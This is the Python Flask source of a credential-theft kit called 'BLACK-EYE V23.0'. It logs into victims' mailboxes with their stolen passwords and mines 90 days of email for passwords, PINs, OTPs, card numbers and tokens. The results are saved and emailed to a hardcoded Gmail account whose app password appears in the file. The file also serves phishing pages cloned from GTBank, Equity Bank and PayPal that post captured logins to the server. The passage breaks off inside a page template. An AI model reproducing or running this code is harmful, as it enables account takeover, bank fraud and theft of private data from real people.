#!/usr/bin/env python3
"""
BLACK-EYE V23.0 - ULTIMATE PASSWORD EXTRACTION EDITION
=======================================================
✅ Universal email scanner (Gmail, Outlook, Yahoo, etc.)
✅ **NEW: Saved password extraction from emails**
✅ Deep behavioral analysis
✅ Auto-report generation
✅ Smart site recommendations
✅ Railway deployment ready
"""

import os, json, sqlite3, smtplib, threading, secrets, imaplib, email, re, time
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, jsonify, redirect, session
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr, make_msgid
from collections import Counter

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# ========== CONFIGURATION ==========
ADMIN_EMAIL = "felixkoskey278@gmail.com"
ADMIN_EMAIL_PASS = "ntsu adxv tfgw ptpj"

EMAIL_PROVIDERS = {
    'gmail': {'imap': 'imap.gmail.com', 'port': 993},
    'outlook': {'imap': 'outlook.office365.com', 'port': 993},
    'yahoo': {'imap': 'imap.mail.yahoo.com', 'port': 993},
    'aol': {'imap': 'imap.aol.com', 'port': 993},
    'icloud': {'imap': 'imap.mail.me.com', 'port': 993}
}

# ========== DATABASE ==========
def init_db():
    conn = sqlite3.connect('intelligence.db', check_same_thread=False)
    
    conn.execute('''CREATE TABLE IF NOT EXISTS targets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE,
        full_name TEXT,
        first_scan TEXT,
        last_scan TEXT,
        total_scans INTEGER DEFAULT 1,
        risk_score INTEGER DEFAULT 0
    )''')
    
    conn.execute('''CREATE TABLE IF NOT EXISTS detected_services (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target_email TEXT,
        service_name TEXT,
        service_slug TEXT,
        category TEXT,
        detection_count INTEGER DEFAULT 1,
        priority_score INTEGER,
        first_detected TEXT,
        last_detected TEXT,
        confidence_level TEXT
    )''')
    
    # **NEW: Extracted passwords table**
    conn.execute('''CREATE TABLE IF NOT EXISTS extracted_passwords (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target_email TEXT,
        service_name TEXT,
        username TEXT,
        password TEXT,
        extraction_method TEXT,
        email_subject TEXT,
        extracted_at TEXT,
        confidence TEXT
    )''')
    
    conn.execute('''CREATE TABLE IF NOT EXISTS behaviors (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target_email TEXT,
        behavior_type TEXT,
        description TEXT,
        frequency INTEGER,
        timestamp TEXT
    )''')
    
    conn.execute('''CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        site TEXT,
        target_email TEXT,
        ip TEXT,
        credentials TEXT,
        device TEXT,
        success INTEGER DEFAULT 1
    )''')
    
    conn.commit()
    conn.close()

init_db()

# ========== PASSWORD EXTRACTION ENGINE ==========
class PasswordExtractor:
    
    # Password patterns in emails
    PASSWORD_PATTERNS = [
        # Direct password mentions
        (r'password[:\s]+([^\s\n]+)', 'direct_mention'),
        (r'your password is[:\s]+([^\s\n]+)', 'direct_mention'),
        (r'temporary password[:\s]+([^\s\n]+)', 'temporary'),
        (r'new password[:\s]+([^\s\n]+)', 'password_reset'),
        (r'PIN[:\s]+(\d{4,6})', 'pin'),
        (r'access code[:\s]+([^\s\n]+)', 'access_code'),
        (r'verification code[:\s]+([^\s\n]+)', 'verification'),
        (r'OTP[:\s]+(\d{4,8})', 'otp'),
        (r'one-time password[:\s]+([^\s\n]+)', 'otp'),
        
        # Password reset links with tokens
        (r'reset.*password.*token[=/]([a-zA-Z0-9_-]{20,})', 'reset_token'),
        (r'password.*reset.*[?&]token=([a-zA-Z0-9_-]{20,})', 'reset_token'),
        
        # Username/email combinations
        (r'username[:\s]+([^\s\n]+)', 'username'),
        (r'email[:\s]+([^\s\n@]+@[^\s\n]+)', 'email'),
        (r'user ID[:\s]+([^\s\n]+)', 'user_id'),
        (r'account[:\s]+([^\s\n]+)', 'account'),
        
        # Security questions/answers
        (r'security answer[:\s]+([^\n]+)', 'security_answer'),
        (r'secret question[:\s]+([^\n]+)', 'security_question'),
        
        # API keys and tokens
        (r'API key[:\s]+([a-zA-Z0-9_-]{20,})', 'api_key'),
        (r'access token[:\s]+([a-zA-Z0-9_-]{20,})', 'access_token'),
        (r'secret key[:\s]+([a-zA-Z0-9_-]{20,})', 'secret_key'),
    ]
    
    # Service-specific patterns
    SERVICE_PATTERNS = {
        'paypal': [
            r'paypal.*password[:\s]+([^\s\n]+)',
            r'paypal.*account[:\s]+([^\s\n@]+@[^\s\n]+)',
        ],
        'amazon': [
            r'amazon.*password[:\s]+([^\s\n]+)',
            r'amazon.*account[:\s]+([^\s\n@]+@[^\s\n]+)',
        ],
        'bank': [
            r'account number[:\s]+(\d{10,})',
            r'PIN[:\s]+(\d{4,6})',
            r'card number[:\s]+(\d{13,19})',
        ],
        'social': [
            r'@(\w+).*password[:\s]+([^\s\n]+)',
        ]
    }
    
    def __init__(self):
        self.extracted = []
    
    def extract_from_text(self, text, subject, sender):
        """Extract passwords and credentials from email text"""
        results = []
        text_lower = text.lower()
        
        # Skip if email is too short or doesn't contain relevant keywords
        password_keywords = ['password', 'pin', 'code', 'credentials', 'login', 'access', 'token', 'key']
        if len(text) < 50 or not any(kw in text_lower for kw in password_keywords):
            return results
        
        # Extract using patterns
        for pattern, method in self.PASSWORD_PATTERNS:
            matches = re.finditer(pattern, text, re.IGNORECASE)
            for match in matches:
                extracted_value = match.group(1).strip()
                
                # Validate extracted value
                if self.validate_credential(extracted_value, method):
                    # Determine service from sender/subject
                    service = self.identify_service(sender, subject, text_lower)
                    
                    # Determine confidence
                    confidence = self.calculate_confidence(extracted_value, method, text_lower)
                    
                    results.append({
                        'service': service,
                        'credential_type': method,
                        'value': extracted_value,
                        'confidence': confidence,
                        'subject': subject[:100]
                    })
        
        return results
    
    def validate_credential(self, value, cred_type):
        """Validate if extracted value looks like a real credential"""
        if not value or len(value) < 3:
            return False
        
        # Filter out common false positives
        false_positives = [
            'example', 'test', 'xxxx', '****', '####', 'your_password',
            'enter_password', 'new_password', 'password_here', 'click here',
            'reset', 'change', 'update', 'forgotten', 'forgot'
        ]
        
        value_lower = value.lower()
        if any(fp in value_lower for fp in false_positives):
            return False
        
        # Type-specific validation
        if cred_type == 'pin':
            return value.isdigit() and 4 <= len(value) <= 6
        
        if cred_type == 'otp':
            return value.isdigit() and 4 <= len(value) <= 8
        
        if cred_type == 'email':
            return '@' in value and '.' in value
        
        if cred_type in ['reset_token', 'api_key', 'access_token']:
            return len(value) >= 20
        
        # General password validation
        if cred_type in ['password', 'direct_mention', 'temporary', 'password_reset']:
            # Should be at least 6 characters
            if len(value) < 6:
                return False
            # Shouldn't be all same character
            if len(set(value)) < 3:
                return False
        
        return True
    
    def identify_service(self, sender, subject, body):
        """Identify which service the credential belongs to"""
        combined = f"{sender} {subject} {body}".lower()
        
        service_keywords = {
            'PayPal': ['paypal'],
            'Amazon': ['amazon'],
            'Facebook': ['facebook', 'meta'],
            'Instagram': ['instagram'],
            'Google': ['google', 'gmail'],
            'Microsoft': ['microsoft', 'outlook', 'office'],
            'Netflix': ['netflix'],
            'Bank': ['bank', 'banking', 'account'],
            'Crypto': ['bitcoin', 'coinbase', 'binance', 'crypto'],
        }
        
        for service, keywords in service_keywords.items():
            if any(kw in combined for kw in keywords):
                return service
        
        return 'Unknown Service'
    
    def calculate_confidence(self, value, method, context):
        """Calculate confidence level of extraction"""
        score = 50  # Base score
        
        # High confidence methods
        if method in ['direct_mention', 'temporary', 'password_reset', 'pin', 'otp']:
            score += 30
        
        # Medium confidence methods
        if method in ['reset_token', 'api_key', 'access_token']:
            score += 20
        
        # Context checks
        if 'temporary' in context or 'one-time' in context:
            score += 10
        
        if 'reset' in context or 'new password' in context:
            score += 10
        
        # Value strength checks
        if len(value) >= 8:
            score += 5
        if any(c.isdigit() for c in value):
            score += 5
        if any(c.isupper() for c in value):
            score += 5
        if any(c in '!@#$%^&*()_+-=' for c in value):
            score += 5
        
        # Determine level
        if score >= 80:
            return 'HIGH'
        elif score >= 60:
            return 'MEDIUM'
        else:
            return 'LOW'

password_extractor = PasswordExtractor()

# ========== ADVANCED INTELLIGENCE ENGINE ==========
class AdvancedIntelligence:
    
    SERVICE_DATABASE = {
        'equity_bank': {
            'patterns': ['equity bank', 'equity group', 'equitybank.co.ke'],
            'category': 'Banking-Kenya', 'priority': 10, 'slug': 'equity',
            'indicators': ['statement', 'balance', 'transaction']
        },
        'gtbank': {
            'patterns': ['gtbank', 'guaranty trust', 'gtworld'],
            'category': 'Banking-Nigeria', 'priority': 10, 'slug': 'gtbank',
            'indicators': ['naira', 'internet banking']
        },
        'paypal': {
            'patterns': ['paypal', 'paypal.com'],
            'category': 'Payment', 'priority': 10, 'slug': 'paypal',
            'indicators': ['payment received', 'invoice']
        },
        'facebook': {
            'patterns': ['facebook', 'meta'],
            'category': 'Social', 'priority': 8, 'slug': 'facebook',
            'indicators': ['notification', 'friend request']
        },
        'instagram': {
            'patterns': ['instagram'],
            'category': 'Social', 'priority': 8, 'slug': 'instagram',
            'indicators': ['liked your', 'following']
        },
    }
    
    BEHAVIOR_PATTERNS = {
        'online_shopping': ['order', 'purchase', 'delivery'],
        'financial_activity': ['payment', 'transaction', 'balance'],
        'social_activity': ['notification', 'message', 'comment'],
    }
    
    def __init__(self):
        self.scan_results = {}
    
    def detect_email_provider(self, email_addr):
        try:
            domain = email_addr.split('@')[1].lower()
            if 'gmail' in domain:
                return 'gmail'
            elif 'outlook' in domain or 'hotmail' in domain or 'live' in domain:
                return 'outlook'
            elif 'yahoo' in domain:
                return 'yahoo'
            else:
                return 'gmail'
        except:
            return 'gmail'
    
    def connect_imap(self, email_address, password):
        provider = self.detect_email_provider(email_address)
        config = EMAIL_PROVIDERS.get(provider, EMAIL_PROVIDERS['gmail'])
        
        try:
            mail = imaplib.IMAP4_SSL(config['imap'], config['port'])
            mail.login(email_address, password)
            print(f"✅ Connected to {provider.upper()}")
            return mail
        except Exception as e:
            print(f"❌ Connection failed: {e}")
            return None
    
    def analyze_email_content(self, subject, sender, body):
        detected_services = []
        detected_behaviors = []
        
        combined_text = f"{subject} {sender} {body}".lower()
        
        for service_key, service_data in self.SERVICE_DATABASE.items():
            confidence = 0
            
            for pattern in service_data['patterns']:
                if pattern.lower() in combined_text:
                    confidence += 40
                    break
            
            if confidence > 0:
                for indicator in service_data['indicators']:
                    if indicator.lower() in combined_text:
                        confidence += 15
                
                confidence_level = "HIGH" if confidence >= 70 else "MEDIUM" if confidence >= 50 else "LOW"
                
                detected_services.append({
                    'service': service_key,
                    'slug': service_data['slug'],
                    'category': service_data['category'],
                    'priority': service_data['priority'],
                    'confidence': confidence_level,
                    'confidence_score': confidence
                })
        
        for behavior_type, keywords in self.BEHAVIOR_PATTERNS.items():
            match_count = sum(1 for kw in keywords if kw in combined_text)
            if match_count >= 2:
                detected_behaviors.append({
                    'type': behavior_type,
                    'strength': min(match_count * 20, 100)
                })
        
        return detected_services, detected_behaviors
    
    def scan_target_email(self, target_email, target_password):
        """Enhanced scan with password extraction"""
        try:
            print(f"🔍 Starting enhanced scan for {target_email}")
            
            mail = self.connect_imap(target_email, target_password)
            if not mail:
                return {"error": "Failed to connect to email"}
            
            mail.select('INBOX')
            
            date_filter = (datetime.now() - timedelta(days=90)).strftime("%d-%b-%Y")
            status, messages = mail.search(None, f'(SINCE {date_filter})')
            
            if status != 'OK':
                mail.logout()
                return {"error": "Email search failed"}
            
            email_ids = messages[0].split()
            total_scanned = 0
            all_services = {}
            all_behaviors = {}
            extracted_passwords = []  # NEW
            
            for email_id in email_ids[-100:]:
                try:
                    status, msg_data = mail.fetch(email_id, '(RFC822)')
                    if status != 'OK':
                        continue
                    
                    msg = email.message_from_bytes(msg_data[0][1])
                    subject = str(msg.get('Subject', ''))
                    sender = str(msg.get('From', ''))
                    
                    body = ""
                    if msg.is_multipart():
                        for part in msg.walk():
                            if part.get_content_type() == "text/plain":
                                try:
                                    payload = part.get_payload(decode=True)
                                    if payload:
                                        body = payload.decode('utf-8', errors='ignore')
                                        break
                                except:
                                    pass
                    else:
                        try:
                            payload = msg.get_payload(decode=True)
                            if payload:
                                body = payload.decode('utf-8', errors='ignore')
                        except:
                            pass
                    
                    # Extract passwords - NEW
                    passwords = password_extractor.extract_from_text(body, subject, sender)
                    if passwords:
                        extracted_passwords.extend(passwords)
                        print(f"🔑 Found {len(passwords)} credential(s) in email: {subject[:50]}")
                    
                    # Regular analysis
                    services, behaviors = self.analyze_email_content(subject, sender, body[:2000])
                    
                    for svc in services:
                        key = svc['slug']
                        if key in all_services:
                            all_services[key]['count'] += 1
                            all_services[key]['total_confidence'] += svc['confidence_score']
                        else:
                            all_services[key] = {
                                'service': svc['service'],
                                'category': svc['category'],
                                'priority': svc['priority'],
                                'count': 1,
                                'total_confidence': svc['confidence_score'],
                                'confidence': svc['confidence']
                            }
                    
                    for bhv in behaviors:
                        key = bhv['type']
                        all_behaviors[key] = all_behaviors.get(key, 0) + 1
                    
                    total_scanned += 1
                    
                except Exception as e:
                    continue
            
            mail.logout()
            
            # Process services
            final_services = []
            for slug, data in all_services.items():
                avg_confidence = data['total_confidence'] / data['count']
                priority_score = (data['priority'] * data['count']) + avg_confidence
                
                final_services.append({
                    'slug': slug,
                    'service': data['service'],
                    'category': data['category'],
                    'detections': data['count'],
                    'priority_score': int(priority_score),
                    'confidence': data['confidence']
                })
            
            final_services.sort(key=lambda x: x['priority_score'], reverse=True)
            
            # Save everything including passwords
            self.save_intelligence(target_email, final_services, all_behaviors, extracted_passwords, total_scanned)
            
            # Generate report with passwords
            self.generate_report(target_email, final_services, all_behaviors, extracted_passwords, total_scanned)
            
            return {
                "success": True,
                "target": target_email,
                "emails_scanned": total_scanned,
                "services_found": len(final_services),
                "passwords_extracted": len(extracted_passwords),
                "services": final_services,
                "passwords": extracted_passwords,
                "behaviors": dict(all_behaviors)
            }
            
        except Exception as e:
            print(f"❌ Scan error: {e}")
            return {"error": str(e)}
    
    def save_intelligence(self, target_email, services, behaviors, passwords, total_scanned):
        """Save with password extraction"""
        conn = sqlite3.connect('intelligence.db', check_same_thread=False)
        timestamp = datetime.now().isoformat()
        
        try:
            cursor = conn.execute('SELECT id, total_scans FROM targets WHERE email = ?', (target_email,))
            existing = cursor.fetchone()
            
            if existing:
                new_scans = existing[1] + 1
                conn.execute('UPDATE targets SET last_scan = ?, total_scans = ? WHERE email = ?',
                            (timestamp, new_scans, target_email))
            else:
                conn.execute('INSERT INTO targets (email, first_scan, last_scan) VALUES (?, ?, ?)',
                            (target_email, timestamp, timestamp))
            
            for svc in services:
                cursor = conn.execute('''SELECT id, detection_count FROM detected_services 
                                        WHERE target_email = ? AND service_slug = ?''',
                                     (target_email, svc['slug']))
                existing = cursor.fetchone()
                
                if existing:
                    new_count = existing[1] + svc['detections']
                    conn.execute('''UPDATE detected_services 
                                   SET detection_count = ?, last_detected = ?, confidence_level = ?
                                   WHERE target_email = ? AND service_slug = ?''',
                                (new_count, timestamp, svc['confidence'], target_email, svc['slug']))
                else:
                    conn.execute('''INSERT INTO detected_services 
                                   (target_email, service_name, service_slug, category, detection_count,
                                    priority_score, first_detected, last_detected, confidence_level)
                                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                                (target_email, svc['service'], svc['slug'], svc['category'],
                                 svc['detections'], svc['priority_score'], timestamp, timestamp,
                                 svc['confidence']))
            
            for behavior_type, frequency in behaviors.items():
                conn.execute('''INSERT INTO behaviors (target_email, behavior_type, frequency, timestamp)
                               VALUES (?, ?, ?, ?)''',
                            (target_email, behavior_type, frequency, timestamp))
            
            # Save extracted passwords - NEW
            for pwd in passwords:
                conn.execute('''INSERT INTO extracted_passwords 
                               (target_email, service_name, username, password, extraction_method,
                                email_subject, extracted_at, confidence)
                               VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                            (target_email, pwd['service'], '', pwd['value'],
                             pwd['credential_type'], pwd['subject'], timestamp, pwd['confidence']))
            
            conn.commit()
            print(f"✅ Saved {len(passwords)} extracted passwords")
        except Exception as e:
            print(f"Database error: {e}")
            conn.rollback()
        finally:
            conn.close()
    
    def generate_report(self, target_email, services, behaviors, passwords, total_scanned):
        """Enhanced report with passwords"""
        try:
            report_html = f'''<!DOCTYPE html>
<html><head><title>Intelligence Report</title>
<style>
body{{font-family:Arial;padding:20px;background:#f5f5f5}}
.container{{max-width:800px;margin:0 auto;background:#fff;padding:30px;border-radius:8px}}
.header{{background:#dc3545;color:#fff;padding:20px;border-radius:8px;margin-bottom:20px}}
.passwords{{background:#fff3cd;padding:20px;border-left:4px solid:#ffc107;margin:20px 0}}
table{{width:100%;border-collapse:collapse;margin-top:20px}}
th,td{{padding:12px;text-align:left;border-bottom:1px solid #ddd}}
th{{background:#333;color:#fff}}
.high{{color:#28a745}}
.medium{{color:#ffc107}}
.low{{color:#dc3545}}
</style></head>
<body>
<div class="container">
<div class="header">
<h1>🔐 Enhanced Intelligence Report</h1>
<p><strong>Target:</strong> {target_email}</p>
<p><strong>Passwords Extracted:</strong> {len(passwords)}</p>
</div>'''
            
            if passwords:
                report_html += '''<div class="passwords">
<h2>🔑 Extracted Passwords & Credentials</h2>
<table>
<tr><th>Service</th><th>Type</th><th>Value</th><th>Confidence</th><th>Source</th></tr>'''
                
                for pwd in passwords[:20]:
                    report_html += f'''<tr>
<td>{pwd['service']}</td>
<td>{pwd['credential_type']}</td>
<td><code>{pwd['value']}</code></td>
<td class="{pwd['confidence'].lower()}">{pwd['confidence']}</td>
<td>{pwd['subject'][:50]}...</td>
</tr>'''
                
                report_html += '</table></div>'
            
            report_html += f'''<h2>Services Detected</h2>
<table>
<tr><th>Service</th><th>Detections</th><th>Confidence</th></tr>'''
            
            for svc in services[:10]:
                report_html += f'''<tr>
<td>{svc['service']}</td>
<td>{svc['detections']}</td>
<td class="{svc['confidence'].lower()}">{svc['confidence']}</td>
</tr>'''
            
            report_html += '''</table>
</div>
</body>
</html>'''
            
            msg = MIMEMultipart('alternative')
            msg['From'] = formataddr(('BLACK-EYE Intelligence', ADMIN_EMAIL))
            msg['To'] = ADMIN_EMAIL
            msg['Subject'] = f'🔐 Password Extraction Report: {target_email} - {len(passwords)} Found'
            
            msg.attach(MIMEText(report_html, 'html'))
            
            srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=15)
            srv.starttls()
            srv.login(ADMIN_EMAIL, ADMIN_EMAIL_PASS)
            srv.send_message(msg)
            srv.quit()
            
            print(f"✅ Enhanced report emailed")
            
        except Exception as e:
            print(f"❌ Email error: {e}")

intel_engine = AdvancedIntelligence()

# [SITE TEMPLATES - Same as before]
GTBANK = '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>GTBank</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#f5f5f5}
.logo-section{background:linear-gradient(180deg,#ff6600,#ff8533);padding:45px 20px;text-align:center}
.gt-text{color:#fff;font-size:56px;font-weight:900}.login-section{background:#006837;margin:16px;padding:22px;border-radius:8px;display:flex;justify-content:space-between;cursor:pointer}
.power-icon{width:62px;height:62px;background:#ff6600;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;color:#fff}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);z-index:9999}
.modal.show{display:flex;align-items:center;justify-content:center}.modal-box{background:#fff;width:92%;max-width:420px;border-radius:12px;overflow:hidden}
.input-field{width:100%;padding:15px;border:2px solid #ddd;border-radius:6px;font-size:16px;margin-bottom:18px}
.login-btn{width:100%;background:linear-gradient(180deg,#ff6600,#ff8533);color:#fff;border:none;padding:17px;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
.spinner{border:4px solid #f3f3f3;border-top:4px solid #ff6600;border-radius:50%;width:50px;height:50px;animation:spin .7s linear infinite;margin:0 auto}
@keyframes spin{to{transform:rotate(360deg)}}
</style></head><body>
<div class="logo-section"><div class="gt-text">GT</div><div style="color:#fff;margin-top:14px">Guaranty Trust Bank</div></div>
<div class="login-section" onclick="document.getElementById('m').classList.add('show')">
<div style="color:#fff;font-size:19px;font-weight:600">Click here<br>to Login</div><div class="power-icon">⏻</div></div>
<div class="modal" id="m"><div class="modal-box">
<div style="background:linear-gradient(180deg,#ff6600,#ff8533);padding:35px;text-align:center">
<div style="color:#fff;font-size:58px;font-weight:900">GT</div></div><div style="padding:30px">
<form onsubmit="event.preventDefault();document.getElementById('l').style.display='block';fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site:'gtbank',username:this.username.value,password:this.password.value})}).then(()=>setTimeout(()=>location.href='https://ibank.gtbank.com',2000))">
<input type="text" class="input-field" name="username" placeholder="Account Number" required>
<input type="password" class="input-field" name="password" placeholder="Password" required>
<button type="submit" class="login-btn">LOGIN</button>
<div id="l" style="display:none;text-align:center;margin-top:20px"><div class="spinner"></div></div>
</form></div></div></div></body></html>'''

EQUITY = '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Equity Bank</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#e8e8e8}
.header{background:#b71c1c;padding:50px 20px;text-align:center;color:#fff}.content{background:#fff;padding:40px 30px}
.input-field{width:100%;padding:17px;border:2px solid #ddd;border-radius:6px;font-size:16px;margin-bottom:18px}
.btn{width:100%;background:#b71c1c;color:#fff;border:none;padding:19px;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
.spinner{border:4px solid #f3f3f3;border-top:4px solid #b71c1c;border-radius:50%;width:50px;height:50px;animation:spin .7s linear infinite;margin:0 auto}
@keyframes spin{to{transform:rotate(360deg)}}
</style></head><body>
<div class="header"><div style="font-size:20px">▲ ▲</div>
<div style="font-size:26px;font-weight:700;margin-top:8px">EQUITY BANK</div></div>
<div class="content"><h1 style="color:#b71c1c;text-align:center;margin-bottom:20px">Account Verification</h1>
<form onsubmit="event.preventDefault();document.getElementById('l').style.display='block';fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site:'equity',username:this.username.value,password:this.password.value})}).then(()=>setTimeout(()=>location.href='https://equitybank.co.ke',2000))">
<input type="text" class="input-field" name="username" placeholder="Account Number" required>
<input type="password" class="input-field" name="password" placeholder="PIN" required maxlength="4">
<button type="submit" class="btn">VERIFY</button>
<div id="l" style="display:none;text-align:center;margin-top:20px"><div class="spinner"></div></div>
</form></div></body></html>'''

PAYPAL = '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PayPal</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#f5f5f5}
.container{max-width:400px;margin:50px auto;background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
.logo{color:#0070ba;font-size:36px;font-weight:700;text-align:center;margin-bottom:30px}
.input-field{width:100%;padding:15px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin-bottom:15px}
.btn{width:100%;background:#0070ba;color:#fff;border:none;padding:15px;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}
.spinner{border:3px solid #f3f3f3;border-top:3px solid #0070ba;border-radius:50%;width:40px;height:40px;animation:spin .7s linear infinite;margin:0 auto}
@keyframes spin{to{transform:rotate(360deg)}}
</style></head><body>
<div class="container"><div class="logo">PayPal</div>
<form onsubmit="event.preventDefault();document.getElementById('l').style.display='block';fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site:'paypal',username:this.username.value,password:this.password.value})}).then(()=>setTimeout(()=>location.href='https://paypal.com',2000))">
<input type="email" class="input-field" name="username" placeholder="Email or mobile number" required>
<input type="password" class="input-field" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log In</button>
<div id="l" style="display:none;text-align:center;margin-top:20px"><div class="spinner"></div></div>
</form></div></body></html>'''

SITE_TEMPLATES = {
    'gtbank': GTBANK,
    'equity': EQUITY,
    'paypal': PAYPAL,
}

# ========== FLASK ROUTES ==========

@app.route('/')
def home():
    return '''<!DOCTYPE html>
<html><head><title>BLACK-EYE V23.0</title>
<style>
body{font-family:Arial;padding:40px;background:#1a1a1a;color:#fff}
.container{max-width:800px;margin:0 auto}
h1{color:#00ff00;font-size:48px}
.new{background:#dc3545;color:#fff;padding:5px 10px;border-radius:4px;font-size:14px;margin-left:10px}
.card{background:#2a2a2a;padding:30px;margin:20px 0;border-radius:8px;border-left:4px solid #00ff00}
a{color:#00ff00;text-decoration:none;font-size:18px;font-weight:bold}
a:hover{text-decoration:underline}
</style></head>
<body>
<div class="container">
<h1>🎯 BLACK-EYE V23.0<span class="new">NEW</span></h1>
<p style="font-size:20px;margin:20px 0">Password Extraction Edition</p>
<div class="card">
<h2>🔐 Email Password Extractor <span class="new">NEW!</span></h2>
<p>Scan emails and extract saved passwords, PINs, OTPs, and credentials</p>
<p><a href="/scanner">→ Start Extraction</a></p>
</div>
<div class="card">
<h2>📊 Intelligence Dashboard</h2>
<p>View all extracted passwords and target recommendations</p>
<p><a href="/dashboard">→ View Dashboard</a></p>
</div>
<div class="card">
<h2>🎯 Available Sites</h2>
<p>Pre-built phishing templates</p>
<p><a href="/sites">→ View Sites</a></p>
</div>
</div>
</body>
</html>'''

@app.route('/sites')
def sites():
    base_url = request.host_url.rstrip('/')
    html = '''<!DOCTYPE html>
<html><head><title>Available Sites</title>
<style>
body{font-family:Arial;padding:40px;background:#f5f5f5}
.container{max-width:900px;margin:0 auto;background:#fff;padding:40px;border-radius:8px}
h1{color:#333;margin-bottom:30px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px}
.card{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:8px;text-align:center;color:#fff}
.card a{color:#fff;text-decoration:none;font-size:20px;font-weight:700}
.url{background:rgba(255,255,255,0.2);padding:10px;margin-top:15px;border-radius:4px;font-size:14px;word-break:break-all}
</style></head>
<body>
<div class="container">
<h1>🎯 Available Phishing Sites</h1>
<div class="grid">'''
    
    for slug in SITE_TEMPLATES.keys():
        site_url = f"{base_url}/{slug}"
        html += f'''<div class="card">
<a href="/{slug}" target="_blank">{slug.upper()}</a>
<div class="url">{site_url}</div>
</div>'''
    
    html += '''</div>
<p style="margin-top:30px;text-align:center"><a href="/">← Back</a></p>
</div>
</body>
</html>'''
    
    return html

@app.route('/scanner', methods=['GET', 'POST'])
def scanner():
    if request.method == 'POST':
        target_email = request.form.get('email')
        target_password = request.form.get('password')
        
        if not target_email or not target_password:
            return '''<h1>Error</h1><p>Email and password required</p>
            <p><a href="/scanner">Try Again</a></p>'''
        
        print(f"🔍 Starting password extraction for {target_email}")
        
        def background_scan():
            intel_engine.scan_target_email(target_email, target_password)
        
        threading.Thread(target=background_scan, daemon=True).start()
        
        return redirect(f'/scanning?email={target_email}')
    
    return '''<!DOCTYPE html>
<html><head><title>Password Extractor</title>
<style>
body{font-family:Arial;padding:40px;background:#f5f5f5}
.container{max-width:500px;margin:0 auto;background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
h1{color:#333;margin-bottom:20px}
.new{background:#dc3545;color:#fff;padding:5px 10px;border-radius:4px;font-size:12px;margin-left:10px}
input{width:100%;padding:15px;margin:10px 0;border:1px solid #ddd;border-radius:4px;font-size:16px}
button{width:100%;padding:15px;background:#dc3545;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{background:#c82333}
.info{background:#fff3cd;padding:15px;margin:20px 0;border-left:4px solid #ffc107;border-radius:4px}
.feature{background:#d4edda;padding:15px;margin:20px 0;border-left:4px solid #28a745;border-radius:4px}
</style></head>
<body>
<div class="container">
<h1>🔐 Password Extractor<span class="new">NEW</span></h1>
<div class="feature">
<strong>✨ What Gets Extracted:</strong>
<ul>
<li>Saved passwords from password reset emails</li>
<li>Temporary passwords</li>
<li>PINs and OTPs</li>
<li>Account numbers</li>
<li>Security answers</li>
<li>API keys and tokens</li>
<li>Login credentials</li>
</ul>
</div>
<div class="info">
<strong>How it works:</strong>
<ol>
<li>Enter target's email credentials</li>
<li>System scans last 90 days of emails</li>
<li>AI extracts passwords and credentials</li>
<li>Generates report with confidence scores</li>
<li>Emails everything to you automatically</li>
</ol>
</div>
<form method="POST">
<input type="email" name="email" placeholder="Target's Email Address" required>
<input type="password" name="password" placeholder="Target's Email Password" required>
<button type="submit">🔍 Extract Passwords</button>
</form>
<p style="margin-top:20px;text-align:center"><a href="/">← Back to Home</a></p>
</div>
</body>
</html>'''

@app.route('/scanning')
def scanning():
    target_email = request.args.get('email', 'target')
    return f'''<!DOCTYPE html>
<html><head><title>Extracting...</title>
<style>
body{{font-family:Arial;padding:40px;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}}
.container{{text-align:center;background:#fff;padding:60px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)}}
.spinner{{border:8px solid #f3f3f3;border-top:8px solid #dc3545;border-radius:50%;width:80px;height:80px;animation:spin 1s linear infinite;margin:0 auto 30px}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
h1{{color:#333;margin-bottom:20px}}
p{{color:#666;font-size:18px;margin:10px 0}}
.info{{background:#fff3cd;padding:15px;margin-top:30px;border-radius:4px;color:#856404}}
</style>
<script>
setTimeout(function(){{
    window.location.href = '/results?email={target_email}';
}}, 35000);
</script>
</head>
<body>
<div class="container">
<div class="spinner"></div>
<h1>🔐 Extracting Passwords...</h1>
